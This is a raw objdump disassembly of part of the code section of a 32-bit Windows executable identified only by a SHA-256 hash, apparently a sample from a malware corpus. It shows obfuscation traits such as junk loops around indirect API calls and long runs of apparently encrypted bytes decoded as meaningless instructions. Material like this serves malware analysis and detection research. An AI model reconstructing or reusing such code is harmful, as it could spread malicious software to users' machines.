
0615318ae33e9c5f59e9c3cc4d0d99d6e18f4fa12740e77cd3b742777a1bf28a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    ecx,0x4d2f
  40100a:	add    BYTE PTR [eax],al
  40100c:	add    al,BYTE PTR [eax]
  40100e:	add    BYTE PTR [eax],al
  401010:	cmp    al,BYTE PTR [eax]
  401012:	add    BYTE PTR [eax],al
  401014:	add    BYTE PTR [eax],al
  401016:	add    DWORD PTR [eax],eax
  401018:	add    BYTE PTR [edx-0x74ab0000],bh
  40101e:	in     al,dx
  40101f:	sub    esp,0x30
  401022:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  401029:	mov    eax,ds:0x44e414
  40102e:	adc    eax,DWORD PTR ds:0x44e428
  401034:	mov    ds:0x44e414,eax
  401039:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  401040:	xor    ecx,0x17d8
  401046:	mov    ecx,DWORD PTR [ebp-0x4]
  401049:	push   ebx
  40104a:	and    DWORD PTR ds:0x448994,0x0
  401054:	xor    eax,eax
  401056:	add    eax,DWORD PTR ds:0x448994
  40105c:	inc    eax
  40105d:	mov    ds:0x448994,eax
  401062:	cmp    DWORD PTR ds:0x448994,0xa
  401069:	jne    0x40108c
  40106f:	push   DWORD PTR [ebp-0x10]
  401072:	push   DWORD PTR [ebp-0x28]
  401075:	push   DWORD PTR [ebp-0x20]
  401078:	push   0x74f6
  40107d:	push   DWORD PTR [ebp-0x24]
  401080:	push   DWORD PTR [ebp-0x28]
  401083:	push   DWORD PTR [ebp-0x20]
  401086:	call   DWORD PTR ds:0x4430c4
  40108c:	cmp    DWORD PTR ds:0x448994,0x9
  401093:	jne    0x4010a4
  401099:	mov    eax,ds:0x448994
  40109e:	inc    eax
  40109f:	mov    ds:0x448994,eax
  4010a4:	cmp    DWORD PTR ds:0x448994,0x17
  4010ab:	jb     0x401054
  4010b1:	add    DWORD PTR ds:0x448980,ecx
  4010b7:	mov    eax,0x7510857
  4010bc:	xor    ecx,eax
  4010be:	xor    DWORD PTR ds:0x44b6dc,0x226
  4010c8:	mov    ebx,0x32729e
  4010cd:	not    DWORD PTR ds:0x44b6e0
  4010d3:	jmp    0x4011a6
  4010d8:	dec    esi
  4010d9:	dec    edx
  4010da:	xor    al,0x5c
  4010dc:	fcom   DWORD PTR [edx+0x66]
  4010df:	jp     0x4010bd
  4010e1:	test   DWORD PTR [ebx+0x58],0xe318b1af
  4010e8:	jl     0x401166
  4010ea:	jl     0x401168
  4010ec:	mov    ds:0xcc7c7c7c,al
  4010f1:	(bad)  
  4010f2:	xor    ecx,ebx
  4010f4:	xor    eax,0xccddcfdb
  4010f9:	ja     0x401171
  4010fb:	or     ecx,DWORD PTR [edi]
  4010fd:	push   0xa
  4010ff:	(bad)  
  401101:	bswap  edx
  401103:	adc    dh,BYTE PTR [edi]
  401105:	sbb    bl,BYTE PTR [edi]
  401107:	mov    ch,0x52
  401109:	or     ah,BYTE PTR [edi-0x4e10f32f]
  40110f:	rol    esp,cl
  401111:	or     ecx,DWORD PTR [esp+edx*1+0x4da8e6bc]
  401118:	sbb    DWORD PTR [ecx+0x541fb4dc],esp
  40111e:	out    dx,al
  40111f:	outs   dx,DWORD PTR ds:[esi]
  401120:	add    ebx,DWORD PTR ds:0x4ac4729e
  401126:	mov    al,ds:0x36dd215b
  40112b:	mov    eax,ds:0xa3c97380
  401131:	je     0x401169
  401133:	fisttp DWORD PTR [ebp+0x359ac4f5]
  401139:	jecxz  0x401175
  40113b:	and    ebp,0x4f
  40113e:	aam    0x94
  401140:	dec    ebp
  401141:	inc    DWORD PTR [edi-0x2f5a886e]
  401147:	mov    cl,0x41
  401149:	loope  0x40116f
  40114b:	pop    ecx
  40114c:	sub    edi,DWORD PTR [eax-0x41639320]
  401152:	jae    0x401171
  401154:	retf   
  401155:	cwde   
  401156:	sub    eax,0xc85ce3c6
  40115b:	(bad)  
  40115c:	mov    dl,0xfa
  40115e:	loopne 0x4010f8
  401160:	cmp    eax,0xc76966cf
  401165:	sub    al,cl
  401167:	or     ch,dl
  401169:	sbb    eax,0xb39945d
  40116e:	outs   dx,DWORD PTR ds:[esi]
  40116f:	ins    DWORD PTR es:[edi],dx
  401170:	jb     0x401174
  401172:	cmp    eax,0x22468cd1
  401177:	jns    0x4011f8
  401179:	cmp    al,0x8f
  40117b:	add    bl,dl
  40117d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40117e:	add    edx,DWORD PTR [ebx+0x59]
  401181:	rol    esp,1
  401183:	add    eax,0x15d55edb
  401188:	jge    0x401126
  40118a:	mov    ah,0x43
  40118c:	daa    
  40118d:	sbb    DWORD PTR [ebx],esp
  40118f:	addr16 and eax,0x4f3cdb10
  401195:	loop   0x401158
  401197:	xchg   esi,eax
  401198:	lds    edi,FWORD PTR [eax]
  40119a:	repnz outs dx,DWORD PTR ds:[esi]
  40119c:	cmc    
  40119d:	fcom   DWORD PTR [ecx]
  40119f:	cmp    eax,DWORD PTR [eax+0x69f655f]
  4011a5:	mov    eax,DWORD PTR [ebx]
  4011a7:	retf   
  4011a8:	adc    DWORD PTR ds:0x42484c,0x44e418
  4011b2:	mov    DWORD PTR [ebp-0x1c],ecx
  4011b5:	xor    DWORD PTR ds:0x41074f,0x5a6f
  4011bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4011c2:	adc    DWORD PTR ds:0x44e414,0x424848
  4011cc:	jmp    0x40129f
  4011d1:	inc    edi
  4011d2:	in     eax,0x24
  4011d4:	xor    bh,BYTE PTR [edx+0x6b7d7dcd]
  4011da:	inc    ebp
  4011db:	in     al,dx
  4011dc:	xchg   BYTE PTR [eax+0x6],bh
  4011df:	mov    WORD PTR [ebx-0x5e],es
  4011e2:	jl     0x401260
  4011e4:	jl     0x401188
  4011e6:	jl     0x401264
  4011e8:	jl     0x40119d
  4011ea:	sbb    DWORD PTR [ecx+0x1e],ebx
  4011ed:	dec    ebp
  4011ee:	daa    
  4011ef:	daa    
  4011f0:	adc    edi,edi
  4011f2:	adc    al,0xb6
  4011f4:	mov    cl,0x85
  4011f6:	push   ebp
  4011f7:	dec    esp
  4011f8:	std    
  4011f9:	pushf  
  4011fa:	popf   
  4011fb:	popa   
  4011fc:	pop    edx
  4011fd:	sahf   
  4011fe:	das    
  4011ff:	aad    0xed
  401201:	lds    eax,FWORD PTR [ebx+edx*4-0x46]
  401205:	outs   dx,DWORD PTR ds:[esi]
  401206:	jbe    0x401212
  401208:	inc    esi
  401209:	sbb    bh,ah
  40120b:	pushf  
  40120c:	sub    ch,BYTE PTR [ebx+eiz*4]
  40120f:	dec    edi
  401210:	loop   0x401291
  401212:	inc    ecx
  401213:	and    BYTE PTR [ebx+0x58],cl
  401216:	dec    eax
  401217:	adc    eax,0xd470d4d9
  40121c:	aam    0x4a
  40121e:	(bad)  
  40121f:	mov    ch,0x60
  401221:	fild   DWORD PTR [eax]
  401223:	addr16 xchg ecx,eax
  401225:	popf   
  401226:	daa    
  401227:	add    BYTE PTR [edi+0x1af28056],bh
  40122d:	cs (bad) 
  40122f:	in     eax,0xdd
  401231:	mov    cl,0x42
  401233:	leave  
  401234:	dec    esp
  401235:	outs   dx,BYTE PTR ds:[esi]
  401236:	pop    es
  401237:	iret   
  401238:	xor    ah,dl
  40123a:	pushf  
  40123b:	inc    edx
  40123c:	cmp    cl,BYTE PTR [edi+0x19f23029]
  401242:	call   0xdfb5c4c7
  401247:	jp     0x401234
  401249:	fld    TBYTE PTR [ebx]
  40124b:	je     0x401215
  40124d:	call   0x7310fae4
  401252:	jbe    0x4011f9
  401254:	clc    
  401255:	adc    esi,DWORD PTR [esi+ebx*8]
  401258:	add    al,0x66
  40125a:	mov    ch,0x1b
  40125c:	repz ss clc 
  40125f:	ret    0xc343
  401262:	mov    ah,0xf8
  401264:	arpl   WORD PTR [edi+0x15],cx
  401267:	xchg   DWORD PTR [eax-0x2306cdaf],esp
  40126d:	test   eax,0x3cd686f8
  401272:	cld    
  401273:	pop    ss
  401274:	mov    BYTE PTR [edx-0x5378c94b],bl
  40127a:	(bad)  
  40127b:	push   eax
  40127c:	sar    DWORD PTR [edi-0x3e],1
  40127f:	cmp    cl,bl
  401281:	icebp  
  401282:	aaa    
  401283:	push   eax
  401284:	inc    eax
  401285:	into   
  401286:	jge    0x4012fa
  401288:	dec    ebp
  401289:	popf   
  40128a:	and    DWORD PTR [edx-0x8],ecx
  40128d:	arpl   WORD PTR [ecx+0x3587cdbb],ax
  401293:	sbb    dl,BYTE PTR [eax+0x42]
  401296:	mov    esi,0xff8e5a08
  40129b:	xor    al,0x9f
  40129d:	xchg   esi,eax
  40129e:	(bad)  
  40129f:	push   esi
  4012a0:	push   edi
  4012a1:	test   ecx,ecx
  4012a3:	mov    DWORD PTR ds:0x424850,0x53ab
  4012ad:	je     0x401398
  4012b3:	and    ecx,ecx
  4012b5:	mov    ecx,DWORD PTR [ebp+0x14]
  4012b8:	and    edi,edi
  4012ba:	jmp    0x40138d
  4012bf:	xchg   DWORD PTR [edi-0x31],eax
  4012c2:	or     ecx,edi
  4012c4:	mov    ebx,DWORD PTR [ebx+0x5b]
  4012c7:	dec    esi
  4012c8:	popa   
  4012c9:	enter  0x72fc,0x84
  4012cd:	dec    ebp
  4012ce:	jno    0x4012b8
  4012d0:	jg     0x40134e
  4012d2:	jl     0x401276
  4012d4:	jl     0x401352
  4012d6:	jl     0x4012f2
  4012d8:	add    cl,BYTE PTR [esi]
  4012da:	and    al,0xd0
  4012dc:	mov    al,ds:0x4325e481
  4012e1:	imul   edx,DWORD PTR [eax-0x18590453],0xffffffbc
  4012e8:	les    edx,FWORD PTR [ebp*2+0x6517578a]
  4012ef:	mov    ch,0x8a
  4012f1:	dec    ebx
  4012f2:	xor    dh,BYTE PTR [edx+edx*4-0x2e]
  4012f6:	push   ebx
  4012f7:	fdivp  st(7),st
  4012f9:	cmp    BYTE PTR [eax+0x7d],cl
  4012fc:	mov    ebp,0x58564aca
  401301:	inc    eax
  401302:	and    esp,ebp
  401304:	add    al,0x5e
  401306:	mov    ah,0x8c
  401308:	mov    dl,0x64
  40130a:	test   eax,0xd2016890
  40130f:	xchg   bh,ah
  401311:	lds    edi,FWORD PTR [esi-0x4d]
  401314:	sbb    BYTE PTR [esi],0x32
  401317:	push   es
  401318:	leave  
  401319:	mov    edi,0x749fe24a
  40131e:	xchg   BYTE PTR [esi+0x67],al
  401321:	inc    esp
  401322:	int    0xac
  401324:	dec    eax
  401325:	stos   BYTE PTR es:[edi],al
  401326:	fild   DWORD PTR [ecx]
  401328:	(bad)  
  401329:	sti    
  40132a:	push   ss
  40132b:	adc    al,0x3c
  40132d:	(bad)  
  40132e:	and    eax,esp
  401330:	push   edi
  401331:	jge    0x401310
  401333:	jb     0x4012ce
  401335:	scas   al,BYTE PTR es:[edi]
  401336:	pop    ss
  401337:	(bad)  
  401338:	fwait
  401339:	xor    ecx,DWORD PTR [edi]
  40133b:	(bad)  
  40133c:	add    DWORD PTR [ecx+0xe0149d7],ebp
  401342:	sbb    ch,BYTE PTR [edx]
  401344:	sbb    al,0x47
  401346:	mov    ds:0x127e0b7a,al
  40134b:	cmp    cl,cl
  40134d:	(bad)  
  40134e:	stc    
  40134f:	shl    BYTE PTR [esi+0x6a],0x45
  401353:	ja     0x4012e8
  401355:	mov    ebx,0x97b64e72
  40135a:	mov    al,ds:0x9ac38cec
  40135f:	fs enter 0xd674,0x7
  401364:	mov    eax,0x978647e0
  401369:	lods   al,BYTE PTR ds:[esi]
  40136a:	sbb    DWORD PTR [edx],edx
  40136c:	ret    
  40136d:	scas   al,BYTE PTR es:[edi]
  40136e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40136f:	sub    al,0x7f
  401371:	pop    ebp
  401372:	retf   
  401373:	inc    ebx
  401374:	mov    eax,0x3eb19dde
  401379:	test   al,0x91
  40137b:	or     DWORD PTR [esi+edi*2-0x636be106],esi
  401382:	fst    QWORD PTR [edi-0x10]
  401385:	inc    esp
  401386:	fwait
  401387:	ds xor edi,esi
  40138a:	dec    ecx
  40138b:	cld    
  40138c:	push   esp
  40138d:	mov    ecx,DWORD PTR [ecx]
  40138f:	sub    DWORD PTR ds:0x41074f,ebx
  401395:	mov    DWORD PTR [ebp-0x1c],ecx
  401398:	sbb    esi,ecx
  40139a:	imul   edx,eax
  40139d:	and    DWORD PTR ds:0x424848,0x618e
  4013a7:	mov    ecx,0x4573
  4013ac:	mov    DWORD PTR ds:0x44b6d8,0x19
  4013b6:	cmp    DWORD PTR ds:0x44b6d8,0x0
  4013bd:	je     0x4013f3
  4013c3:	cmp    DWORD PTR ds:0x44b6d8,0x1a
  4013ca:	jne    0x4013d9
  4013d0:	push   DWORD PTR [ebp-0x1c]
  4013d3:	call   DWORD PTR ds:0x443338
  4013d9:	xor    edi,edi
  4013db:	or     edi,DWORD PTR ds:0x44b6d8
  4013e1:	dec    edi
  4013e2:	mov    DWORD PTR ds:0x44b6d8,edi
  4013e8:	jmp    0x4013b6
  4013ed:	xor    DWORD PTR ds:0x448980,edx
  4013f3:	add    edx,ecx
  4013f5:	inc    edi
  4013f6:	mov    esi,0x7879
  4013fb:	add    DWORD PTR ds:0x44b6e8,edx
  401401:	mov    edi,0x1556
  401406:	sub    DWORD PTR ds:0x4489a4,0x41074b
  401410:	xchg   esi,ecx
  401412:	xor    DWORD PTR ds:0x44e420,ecx
  401418:	sub    edx,edi
  40141a:	or     ecx,0x50d4
  401420:	xor    esi,esi
  401422:	mov    DWORD PTR [ebp-0x28],esi
  401425:	movzx  ecx,WORD PTR ds:0x44e420
  40142c:	xor    DWORD PTR ds:0x44e414,ecx
  401432:	mov    DWORD PTR [ebp-0x2c],esi
  401435:	or     ecx,0x6619
  40143b:	mov    DWORD PTR [ebp-0x14],esi
  40143e:	mov    ecx,DWORD PTR ds:0x410757
  401444:	xor    DWORD PTR ds:0x424840,ecx
  40144a:	jmp    0x40151d
  40144f:	ficom  WORD PTR [esi+0x7b7d5fa5]
  401455:	loop   0x401400
  401457:	sbb    al,0x21
  401459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40145a:	out    dx,eax
  40145b:	out    0x69,al
  40145d:	adc    al,0x1e
  401460:	jle    0x4014de
  401462:	jl     0x401406
  401464:	jl     0x4014e2
  401466:	jl     0x401419
  401468:	(bad)  
  401469:	jmp    0x6b02b8d6
  40146e:	mov    bl,0x33
  401470:	lock das 
  401472:	adc    eax,DWORD PTR [ecx+0x61952eff]
  401478:	scas   eax,DWORD PTR es:[edi]
  401479:	mov    DWORD PTR [ebp+0x4208ac61],edx
  40147f:	inc    edx
  401480:	mov    ebp,0x8195a259
  401485:	iret   
  401486:	out    dx,eax
  401487:	xor    DWORD PTR [ecx+0x9],ebp
  40148a:	retf   0x6d82
  40148d:	pop    ebp
  40148e:	and    eax,DWORD PTR [esi-0x79510b9f]
  401494:	int3   
  401495:	mov    ds:0x1e29dc6a,eax
  40149a:	jo     0x4014af
  40149c:	mov    al,0x89
  40149e:	adc    DWORD PTR [edx],0x9
  4014a1:	popf   
  4014a2:	mov    ch,0x37
  4014a4:	fcmovne st,st(2)
  4014a6:	pop    ds
  4014a7:	aam    0x29
  4014a9:	pushf  
  4014aa:	mov    ebp,0xd9f04864
  4014af:	retf   0x2700
  4014b2:	push   ecx
  4014b3:	jp     0x40148e
  4014b5:	lods   eax,DWORD PTR ds:[esi]
  4014b6:	ror    DWORD PTR [edi],0xfa
  4014b9:	cs sbb eax,0x4bde231c
  4014bf:	icebp  
  4014c0:	push   ss
  4014c1:	lea    ebx,[ebx-0x67]
  4014c4:	out    dx,al
  4014c5:	mov    gs,WORD PTR [edx-0x6b]
  4014c8:	sar    DWORD PTR [bp+di],0xb5
  4014cc:	adc    eax,0x15ad3a4f
  4014d1:	ss js  0x40151e
  4014d4:	xchg   ebx,eax
  4014d5:	dec    eax
  4014d6:	jb     0x40149a
  4014d8:	xor    al,0x3e
  4014da:	sub    DWORD PTR [ecx],ecx
  4014dc:	(bad)  
  4014df:	or     DWORD PTR [ecx+ecx*8-0x4435ef44],ebx
  4014e6:	loope  0x4014be
  4014e8:	in     eax,dx
  4014e9:	cmp    DWORD PTR [edi-0x242e39f1],0x4987eaf9
  4014f3:	inc    ecx
  4014f4:	cmove  ecx,DWORD PTR [ebx]
  4014f7:	mov    bh,0x8
  4014f9:	mov    dh,0x6d
  4014fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014fc:	cmp    al,0xf8
  4014fe:	adc    al,0x7a
  401500:	std    
  401501:	cmc    
  401502:	mov    ebx,0x992b1130
  401507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401508:	cmc    
  401509:	push   esi
  40150a:	loopne 0x4014cd
  40150c:	mov    ds:0xf866ac6d,eax
  401511:	push   es
  401512:	ds ins BYTE PTR es:[edi],dx
  401514:	jmp    0x401558
  401516:	aaa    
  401517:	xchg   DWORD PTR [esi],ebp
  401519:	fadd   DWORD PTR [esp+ebp*8-0x78a762f]
  401520:	jmp    0x4015f3
  401525:	add    DWORD PTR [eax],edi
  401527:	repz push esp
  401529:	lods   eax,DWORD PTR ds:[esi]
  40152a:	addr16 std 
  40152c:	jge    0x401526
  40152e:	stc    
  40152f:	icebp  
  401530:	sahf   
  401531:	das    
  401532:	cmp    edi,DWORD PTR [edx-0x18]
  401535:	inc    esp
  401536:	jle    0x4015b4
  401538:	jl     0x4014dc
  40153a:	jl     0x4015b8
  40153c:	jl     0x40157e
  40153e:	(bad)  
  401542:	mov    DWORD PTR [edi+ebp*4+0x86ea009],esp
  401549:	scas   eax,DWORD PTR es:[edi]
  40154a:	gs loope 0x4015cc
  40154d:	inc    edx
  40154e:	dec    eax
  40154f:	lea    ecx,[esi]
  401551:	jecxz  0x4015b0
  401553:	call   0xb75f:0xea04ad54
  40155a:	nop
  40155b:	add    al,cl
  40155d:	(bad)  
  40155e:	scas   al,BYTE PTR es:[edi]
  40155f:	jmp    0xc785:0x589a24e1
  401566:	lods   al,BYTE PTR ds:[esi]
  401567:	add    bl,0xa3
  40156a:	dec    ebx
  40156b:	dec    edi
  40156c:	ror    BYTE PTR [esi+0x6f],0x82
  401570:	dec    ecx
  401571:	adc    dl,BYTE PTR [ebp+0x70]
  401574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401575:	fadd   QWORD PTR [ebp-0x38569bd1]
  40157b:	sub    eax,0xd3180dcb
  401580:	jne    0x4015d6
  401582:	pop    ds
  401583:	leave  
  401584:	dec    edx
  401585:	add    ah,dl
  401587:	lods   al,BYTE PTR ds:[esi]
  401588:	cdq    
  401589:	jge    0x4015b4
  40158b:	cdq    
  40158c:	fstp   DWORD PTR [esi]
  40158e:	mov    bl,0xab
  401590:	push   esp
  401591:	mov    bh,0x3
  401593:	dec    DWORD PTR [esi]
  401595:	mov    al,0x2
  401597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401598:	inc    esp
  401599:	in     eax,dx
  40159a:	int    0x5f
  40159c:	hlt    
  40159d:	push   edx
  40159e:	in     eax,0xab
  4015a0:	pop    ss
  4015a1:	xor    bh,BYTE PTR [eax+edi*4]
  4015a4:	and    BYTE PTR [eax+0x3a],bh
  4015a7:	sub    al,0xcd
  4015a9:	addr16 mov bh,0xfb
  4015ac:	push   ebp
  4015ad:	(bad)  
  4015ae:	rcr    esi,0xa2
  4015b1:	jmp    0x22a6266f
  4015b6:	or     eax,0xaff1acc5
  4015bb:	loope  0x4015b4
  4015bd:	and    ebx,esi
  4015bf:	daa    
  4015c0:	sub    DWORD PTR [edi],0xf8730405
  4015c6:	mov    eax,ds:0x4b57b276
  4015cb:	push   edx
  4015cc:	push   edi
  4015cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015ce:	in     al,0x79
  4015d0:	and    esi,ecx
  4015d2:	xchg   DWORD PTR [ebx-0xc],edx
  4015d5:	push   edi
  4015d6:	rcr    BYTE PTR [ebx-0xe],cl
  4015d9:	and    BYTE PTR ds:0xe9d981b9,ah
  4015df:	es ins DWORD PTR es:[edi],dx
  4015e1:	(bad)  
  4015e2:	jno    0x40162c
  4015e4:	pop    es
  4015e5:	xchg   edi,eax
  4015e6:	or     eax,0x54fbbe9c
  4015eb:	cld    
  4015ec:	fs pop esi
  4015ee:	fnstsw WORD PTR [eax-0x79]
  4015f1:	sbb    cl,dh
  4015f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4015f6:	sbb    DWORD PTR ds:0x410743,0x410747
  401600:	xor    ecx,eax
  401602:	mov    DWORD PTR ds:0x41074b,0x13
  40160c:	cmp    DWORD PTR ds:0x41074b,0x0
  401613:	je     0x401657
  401619:	cmp    DWORD PTR ds:0x41074b,0x2
  401620:	jne    0x40162f
  401626:	push   DWORD PTR [ebp-0xc]
  401629:	call   DWORD PTR ds:0x44333c
  40162f:	cmp    DWORD PTR ds:0x41074b,0x3
  401636:	jne    0x401647
  40163c:	mov    eax,ds:0x41074b
  401641:	dec    eax
  401642:	mov    ds:0x41074b,eax
  401647:	mov    eax,ds:0x41074b
  40164c:	dec    eax
  40164d:	mov    ds:0x41074b,eax
  401652:	jmp    0x40160c
  401657:	xor    edi,edi
  401659:	add    ecx,ebx
  40165b:	mov    eax,ds:0x424854
  401660:	mov    DWORD PTR [ebp-0x20],ecx
  401663:	mov    eax,DWORD PTR [ebp-0x20]
  401666:	mov    DWORD PTR ds:0x410747,0x348
  401670:	je     0x402298
  401676:	mov    eax,DWORD PTR [ebp-0x4]
  401679:	xor    DWORD PTR ds:0x44b6d8,0x44e410
  401683:	xor    eax,0x7510857
  401688:	jmp    0x40175b
  40168d:	in     eax,0x57
  40168f:	iret   
  401690:	call   0x2571:0x577dba5d
  401697:	mov    esi,0x214a986a
  40169c:	lods   al,BYTE PTR ds:[esi]
  40169d:	mov    dh,BYTE PTR [ecx+0x7c]
  4016a0:	jl     0x401644
  4016a2:	jl     0x401720
  4016a4:	jl     0x401643
  4016a6:	add    DWORD PTR [ecx-0x8],esp
  4016a9:	sbb    eax,0xb3f6d62b
  4016ae:	mov    esi,0xf081efdf
  4016b3:	push   esi
  4016b4:	popa   
  4016b5:	out    dx,eax
  4016b6:	sbb    DWORD PTR [edi+0x233985b2],edi
  4016bc:	std    
  4016bd:	push   ecx
  4016be:	and    BYTE PTR [edi+0x29b03d68],ah
  4016c4:	lods   eax,DWORD PTR ds:[esi]
  4016c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016c6:	imul   eax,DWORD PTR [esi],0x88e832dc
  4016cc:	shr    BYTE PTR [esi],0xa4
  4016cf:	jmp    0xbc28:0xd8a3d7ea
  4016d6:	clc    
  4016d7:	int    0x81
  4016d9:	cs pop edi
  4016db:	pop    edx
  4016dc:	xor    al,0xed
  4016de:	mov    ?,esp
  4016e0:	mov    ds:0x32a9b2b5,eax
  4016e5:	jl     0x401713
  4016e7:	dec    eax
  4016e8:	imul   esi,esp,0x7c
  4016eb:	mov    edi,0xd00d3d1c
  4016f0:	mov    ds:0x7ed89ad5,eax
  4016f5:	pop    edx
  4016f6:	lock lahf 
  4016f8:	in     eax,0xe3
  4016fa:	inc    ebp
  4016fb:	mov    edx,0x3d2a83fb
  401700:	and    bl,bh
  401702:	out    0xd4,eax
  401704:	xchg   ecx,eax
  401705:	jb     0x4016d4
  401707:	mov    eax,ds:0x3bfcae0
  40170c:	(bad)  
  40170d:	adc    DWORD PTR [edi-0x6be6c32b],ecx
  401713:	lock imul ecx,edi,0xabfc918d
  40171a:	bound  edx,QWORD PTR [edx-0x7d78ae4e]
  401720:	xchg   esp,eax
  401721:	mov    ch,0x2e
  401723:	dec    edx
  401724:	sub    DWORD PTR [edx],0xffffffb2
  401727:	adc    eax,0xc4b7f03c
  40172c:	mov    edi,0xc36df196
  401731:	jp     0x4016c5
  401733:	cs dec ebp
  401735:	add    eax,0xfdda6721
  40173a:	or     eax,0x75b0627a
  40173f:	loope  0x40171a
  401741:	test   DWORD PTR [edi-0xd],0x4b6ddde6
  401748:	adc    al,0x24
  40174a:	ss sahf 
  40174c:	imul   eax,esp,0x26
  40174f:	mov    esp,DWORD PTR [esi]
  401751:	xchg   ecx,eax
  401752:	push   eax
  401753:	ins    BYTE PTR es:[edi],dx
  401754:	cmp    ch,dl
  401756:	enter  0xf6a7,0xf1
  40175a:	jo     0x40175f
  40175c:	ret    
  40175d:	mov    DWORD PTR ds:0x4489a4,0x156f
  401767:	cmp    edi,eax
  401769:	mov    DWORD PTR ds:0x44e414,0x5e58
  401773:	jne    0x401eef
  401779:	push   DWORD PTR [ebp+0x8]
  40177c:	add    DWORD PTR ds:0x44b6e4,0x4489a0
  401786:	call   0x409b25
  40178b:	mov    DWORD PTR ds:0x44e414,0x72d4
  401795:	mov    DWORD PTR [ebp-0x20],eax
  401798:	and    DWORD PTR ds:0x41073f,0x0
  4017a2:	jmp    0x4017b4
  4017a7:	mov    ecx,DWORD PTR ds:0x41073f
  4017ad:	inc    ecx
  4017ae:	mov    DWORD PTR ds:0x41073f,ecx
  4017b4:	cmp    DWORD PTR ds:0x41073f,0x16
  4017bb:	jae    0x4018af
  4017c1:	cmp    DWORD PTR ds:0x41073f,0x25
  4017c8:	jne    0x4017d7
  4017ce:	push   DWORD PTR [ebp-0x1c]
  4017d1:	call   DWORD PTR ds:0x443340
  4017d7:	jmp    0x4017a7
  4017dc:	jmp    0x4018af
  4017e1:	fdiv   st(2),st
  4017e3:	jmp    0xef7a:0x5462fa52
  4017ea:	into   
  4017eb:	outs   dx,DWORD PTR ds:[esi]
  4017ec:	inc    ecx
  4017ed:	lea    edi,[ecx+0x7030371e]
  4017f3:	jl     0x401871
  4017f5:	mov    ds:0x1f7c7c7c,al
  4017fa:	xor    ch,ah
  4017fc:	ror    DWORD PTR [ebx],1
  4017fe:	dec    esp
  4017ff:	sub    esp,ebx
  401801:	retf   0xc3ff
  401804:	ret    
  401805:	stc    
  401806:	int3   
  401807:	push   esp
  401808:	outs   dx,BYTE PTR ds:[esi]
  401809:	stc    
  40180a:	xchg   ebx,eax
  40180b:	mov    ebx,0x6b24c59b
  401810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401811:	lahf   
  401812:	data16 fld TBYTE PTR [eax+eiz*2-0x47a13708]
  40181a:	jge    0x401875
  40181c:	adc    cl,BYTE PTR [edi+0x74]
  40181f:	or     eax,0xcb152ad3
  401824:	mov    al,0x77
  401826:	adc    ch,ch
  401828:	ror    DWORD PTR [eax-0x19],0x99
  40182c:	std    
  40182d:	jne    0x401882
  40182f:	add    BYTE PTR [ecx+0x1b],ch
  401832:	dec    ebx
  401833:	fbstp  TBYTE PTR [eax]
  401835:	jnp    0x4017cb
  401837:	shl    DWORD PTR ds:0xd7e8ad76,1
  40183d:	xlat   BYTE PTR fs:[ebx]
  40183f:	sbb    cl,BYTE PTR [ecx-0x39]
  401842:	loope  0x4018bc
  401844:	mov    ds:0xc847c9ab,eax
  401849:	push   ecx
  40184a:	pop    ebp
  40184b:	and    al,0x3e
  40184d:	outs   dx,BYTE PTR ds:[esi]
  40184e:	fidiv  WORD PTR [ebx-0x5291f44c]
  401854:	or     al,0xd4
  401856:	adc    eax,0xb57fc859
  40185b:	mov    esi,0x8154cbdc
  401860:	stos   BYTE PTR es:[edi],al
  401861:	iret   
  401862:	pop    esi
  401863:	and    esp,edi
  401865:	or     eax,0xb6bb613f
  40186a:	sub    ch,al
  40186c:	jle    0x401855
  40186e:	mov    al,0xdd
  401871:	lods   al,BYTE PTR ds:[esi]
  401872:	xor    DWORD PTR [edx],ecx
  401874:	test   DWORD PTR [eax+0x7b843b96],0x7e68f98c
  40187e:	sbb    BYTE PTR [ecx-0x4f],0x9f
  401882:	in     eax,0x6b
  401884:	(bad)  
  401885:	leave  
  401886:	test   al,0x3
  401888:	cmc    
  401889:	popf   
  40188a:	mov    dl,0xa9
  40188c:	jg     0x4018fd
  40188e:	and    al,0x9
  401890:	stos   BYTE PTR es:[edi],al
  401891:	or     edi,esi
  401893:	hlt    
  401894:	das    
  401895:	pop    edx
  401896:	loope  0x401824
  401898:	mov    es,WORD PTR [ecx-0x68f916e0]
  40189e:	mov    edi,DWORD PTR [edi+0x15]
  4018a1:	cmp    bh,BYTE PTR [edi-0x5a]
  4018a4:	pop    ebp
  4018a5:	scas   al,BYTE PTR es:[edi]
  4018a6:	fsubr  QWORD PTR [eax-0x60b5fb5f]
  4018ac:	sbb    ah,BYTE PTR [edi]
  4018ae:	adc    ecx,DWORD PTR [ebx+0x3d31fc45]
  4018b4:	or     al,0xe4
  4018b6:	inc    esp
  4018b7:	add    BYTE PTR [ebx+0x1d11e04d],cl
  4018bd:	aam    0xb6
  4018bf:	inc    esp
  4018c0:	add    BYTE PTR [esi+0x7510857],bh
  4018c6:	xor    eax,esi
  4018c8:	adc    DWORD PTR ds:0x44898c,0x424854
  4018d2:	add    eax,ebx
  4018d4:	mov    DWORD PTR ds:0x448998,0x1172
  4018de:	cmp    ecx,eax
  4018e0:	mov    DWORD PTR ds:0x44899c,0x309e
  4018ea:	je     0x4021a9
  4018f0:	sub    DWORD PTR ds:0x41074b,0x410743
  4018fa:	push   DWORD PTR [ebp-0x20]
  4018fd:	jmp    0x4019d0
  401902:	js     0x40197b
  401904:	dec    ecx
  401905:	mov    bh,BYTE PTR [ebp+0x4a]
  401908:	jnp    0x401903
  40190a:	hlt    
  40190b:	push   esi
  40190c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40190d:	imul   ebp,DWORD PTR [ebp+0x66359a7d],0x70
